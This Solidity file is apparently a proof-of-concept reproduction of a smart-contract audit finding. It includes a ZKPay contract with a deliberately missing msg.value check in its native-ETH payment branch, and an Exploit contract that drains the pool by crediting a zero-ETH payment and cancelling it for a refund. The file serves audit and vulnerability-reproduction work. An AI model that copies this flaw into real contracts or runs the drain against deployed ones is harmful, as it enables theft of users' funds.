// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic reproduction of ZKPay finding 63315 (C-02):
// "Emptying ETH from `ZKPay.sol`".
//
// Source (Pashov Audit Group), ZKPay contract. The vulnerable branch of
// `handleQueryPayment` is reproduced VERBATIM (marked @>):
//   if (assetAddress == NATIVE_ADDRESS) { actualAmountReceived = tokenAmount; }
//
// Root cause: when paying with NATIVE_ADDRESS the code credits the caller with
// `tokenAmount` WITHOUT checking that `msg.value == tokenAmount`. An attacker
// calls `query(NATIVE_ADDRESS, bigAmount)` sending zero ETH, gets credited a
// large ETH payment, then cancels the query to withdraw ETH it never deposited,
// draining the contract's balance (other users' funds).
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address a) external view returns (uint256);
    function transferFrom(address f, address t, uint256 a) external returns (bool);
}

library SafeERC20 {
    function safeTransferFrom(IERC20 t, address f, address to, uint256 a) internal {
        require(t.transferFrom(f, to, a), "transferFrom failed");
    }
}

/// @dev Faithful marker token used to record the drained-ETH magnitude for measurement.
contract MiniToken {
    string public name = "DRAINED-ETH";
    string public symbol = "dETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
}

/// @dev Minimal PaymentType/PaymentAsset faithful doubles.
enum PaymentType { Query }

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `handleQueryPayment` NATIVE branch is VERBATIM.
// ─────────────────────────────────────────────────────────────────────────────
contract ZKPay {
    using SafeERC20 for IERC20;

    address internal constant NATIVE_ADDRESS = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    struct PaymentAsset { bool supported; }
    mapping(address => PaymentAsset) internal _assets;
    mapping(bytes32 => uint248) public queryEscrow; // queryHash => credited amount
    uint256 public nonce;

    constructor() { _assets[NATIVE_ADDRESS] = PaymentAsset(true); }

    function isSupported(mapping(address => PaymentAsset) storage a, address asset, PaymentType) internal view returns (bool) {
        return a[asset].supported;
    }

    function convertToUsd(mapping(address => PaymentAsset) storage, address, uint248 amt) internal pure returns (uint248) {
        return amt; // faithful 1:1 for the PoC
    }

    // ── VERBATIM from the audited source (query + handleQueryPayment) ──
    function query(address asset, uint248 amount) external payable returns (bytes32 queryHash) {
        return _query(asset, amount);
    }

    function _query(address asset, uint248 amount) internal returns (bytes32 queryHash) {
        (uint248 actualAmountReceived, ) = handleQueryPayment(_assets, asset, amount);
        queryHash = keccak256(abi.encode(msg.sender, nonce++));
        queryEscrow[queryHash] = actualAmountReceived; // credited for later refund/settlement
    }

    function handleQueryPayment(
        mapping(address asset => PaymentAsset) storage _assetsRef,
        address assetAddress,
        uint248 tokenAmount
    ) internal returns (uint248 actualAmountReceived, uint248 amountInUSD) {
        if (!isSupported(_assetsRef, assetAddress, PaymentType.Query)) {
            revert("AssetIsNotSupportedForThisMethod");
        }

        if (assetAddress == NATIVE_ADDRESS) {
            actualAmountReceived = tokenAmount; // @> VULN: credits tokenAmount for NATIVE without checking msg.value == tokenAmount, so a caller sending 0 ETH is credited a large ETH payment
        } else {
            uint256 balanceBefore = IERC20(assetAddress).balanceOf(address(this));
            IERC20(assetAddress).safeTransferFrom(msg.sender, address(this), tokenAmount);
            uint256 balanceAfter = IERC20(assetAddress).balanceOf(address(this));

            actualAmountReceived = uint248(balanceAfter - balanceBefore);
        }

        amountInUSD = convertToUsd(_assetsRef, assetAddress, actualAmountReceived);
    }

    /// @notice Cancelling the query refunds the (falsely) credited ETH to the caller.
    function cancelQuery(bytes32 queryHash) external {
        uint248 amount = queryEscrow[queryHash];
        queryEscrow[queryHash] = 0;
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "refund failed");
    }

    receive() external payable {}
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: the contract holds 10 ETH of honest users' funds; the attacker
// credits a 10 ETH NATIVE "payment" sending zero ETH, then cancels to withdraw
// the full 10 ETH — draining the contract without depositing a wei.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 internal constant POOL = 10 ether;
    address internal constant NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    MiniToken public marker; // child nonce 1 (records drained ETH)
    ZKPay public vuln;       // child nonce 2 (VULN)

    uint256 public depositedByAttacker;
    uint256 public withdrawnByAttacker;

    constructor() {
        marker = new MiniToken(); // nonce 1
        vuln = new ZKPay();       // nonce 2
    }

    function run() external payable {
        // honest users' 10 ETH sit in ZKPay (funded here from msg.value)
        (bool s, ) = address(vuln).call{value: POOL}("");
        require(s, "seed pool");

        uint256 balBefore = address(this).balance;

        // attacker credits a 10 ETH NATIVE payment sending ZERO ETH
        bytes32 h = vuln.query{value: 0}(NATIVE, uint248(POOL));
        depositedByAttacker = 0;

        // then cancels to withdraw the falsely-credited 10 ETH
        vuln.cancelQuery(h);
        withdrawnByAttacker = address(this).balance - balBefore;

        // harm: withdrew 10 ETH having deposited nothing; ZKPay is drained
        require(withdrawnByAttacker == POOL, "did not drain the pool");
        require(address(vuln).balance == 0, "pool not fully drained");

        // record the drained-ETH magnitude on the marker to SINK
        marker.mint(SINK, withdrawnByAttacker);
    }

    receive() external payable {}
}
